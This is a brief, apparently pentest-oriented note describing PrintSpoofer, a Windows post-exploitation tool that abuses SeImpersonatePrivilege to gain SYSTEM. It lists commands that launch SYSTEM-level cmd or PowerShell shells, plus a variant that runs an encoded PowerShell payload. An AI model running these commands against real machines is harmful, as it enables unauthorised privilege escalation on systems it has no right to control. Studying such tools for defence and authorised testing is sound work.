What is PrintSpoofer.exe?

PrintSpoofer.exe is a post-exploitation tool used in Windows environments to escalate privileges by exploiting weaknesses in the Print Spooler service. It primarily focuses on abusing SeImpersonatePrivilege to gain elevated privileges, such as SYSTEM or Administrator, from a lower-privileged account.

Usage

.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c powershell
  • -i : specifies interactive mode, meaning the attacker wants to interact with a SYSTEM-level shell.
  • -c cmd : launches the command prompt (cmd.exe) as SYSTEM.

When the PrintSpoofer doesn't upgrade your account...

.\PrintSpoofer64.exe -i -c 'powershell -e BASE64_CODE'
